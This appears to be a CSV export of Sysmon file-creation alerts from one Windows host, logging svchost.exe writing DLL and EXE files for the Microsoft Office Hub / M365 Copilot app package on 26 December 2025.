"2025-12-26 11:29:12.000 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174884,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\M365CopilotShared.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.997 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.997","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.000 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174885,"Rule: EXE ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\m365copilot_autostarter.exe ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.997 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.997","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.000 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174886,"Rule: EXE ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\m365copilot_widget.exe ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.997 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.999","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.000 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174887,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\McpClient.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.999 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.999","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.003 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174888,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\microsoft-signalr.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.999 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.999","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.003 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174889,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.AspNetCore.Connections.Abstractions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.000 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.000","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.003 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174890,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.AspNetCore.Http.Connections.Client.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.000 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.000","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.003 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174891,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.AspNetCore.Http.Connections.Common.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.000 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.000","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.003 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174892,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.AspNetCore.SignalR.Client.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.002 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.002","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.004 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174893,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.AspNetCore.SignalR.Client.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.002 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.002","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.005 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174894,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.AspNetCore.SignalR.Common.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.002 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.002","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.005 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174895,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.AspNetCore.SignalR.Protocols.Json.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.002 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.004","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.006 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174896,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Bcl.AsyncInterfaces.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.004 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.004","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.006 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174897,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Bcl.TimeProvider.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.004 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.004","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.007 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174898,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.CognitiveServices.Speech.core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.004 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.004","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.013 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174899,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.CognitiveServices.Speech.csharp.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.006 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.006","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.014 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174900,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.CognitiveServices.Speech.extension.audio.sys.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.006 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.006","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.014 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174901,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.CognitiveServices.Speech.extension.codec.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.006 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.006","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.014 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174902,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.CognitiveServices.Speech.extension.kws.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.008 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.008","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.014 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174903,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.CognitiveServices.Speech.extension.kws.ort.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.008 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.008","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.015 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174904,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.CognitiveServices.Speech.extension.lu.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.008 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.008","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.015 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174905,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.AI.Abstractions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.010 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.010","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.015 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174906,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Configuration.Abstractions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.010 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.010","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.015 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174907,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Configuration.Binder.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.013 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.013","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.015 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174908,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Configuration.CommandLine.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.013 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.013","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.015 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174909,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Configuration.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.013 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.013","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.016 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174910,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Configuration.EnvironmentVariables.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.013 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.013","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.016 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174911,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Configuration.FileExtensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.015 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.015","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.016 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174912,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Configuration.Json.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.015 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.015","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.020 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174913,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Configuration.UserSecrets.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.015 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.015","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.021 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174914,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.DependencyInjection.Abstractions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.016 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.016","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.021 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174915,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.DependencyInjection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.016 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.016","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.021 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174916,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Diagnostics.Abstractions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.016 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.016","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.021 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174917,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Diagnostics.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.016 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.018","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.021 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174918,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Features.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.018 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.018","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.021 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174919,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.FileProviders.Abstractions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.018 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.018","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.021 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174920,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.FileProviders.Physical.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.018 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.020","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.021 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174921,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.FileSystemGlobbing.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.020 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.020","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
